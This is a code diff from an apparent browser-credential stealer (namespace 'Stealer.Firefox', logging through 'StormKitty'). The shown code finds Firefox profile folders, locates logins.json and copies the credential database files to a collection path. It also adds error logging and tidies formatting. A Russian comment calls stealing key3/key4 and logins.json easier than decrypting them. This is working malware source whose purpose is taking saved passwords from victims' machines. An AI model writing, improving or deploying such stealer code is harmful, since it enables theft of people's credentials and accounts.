@@ -14,25 +14,21 @@ namespace Stealer.Firefox
 				if (File.Exists(from))
 					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
 			}
-			catch { }
+			catch (System.Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to copy logins\n" + ex); }
 		}
 
 		/*
 			Дешифровка паролей Gecko браузеров - та еще жопa.
 			Проще стырить два файла(key3.dll/key4.dll и logins.json)
-			и расшифровать их бесплатной прогой от NirSoft.
-			https://www.nirsoft.net/utils/passwordfox.html
+			переместить их и посмотреть в настройках браузера.
 		*/
 		public static void GetDBFiles(string path, string sSavePath)
 		{
 			// If browser path not exists
-			if (!Directory.Exists(path))
-				return;
-
+			if (!Directory.Exists(path)) return;
 			// Detect logins.json file
 			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
-			if (files == null)
-				return;
+			if (files == null) return;
 
 			foreach (string dbpath in files)
 			{
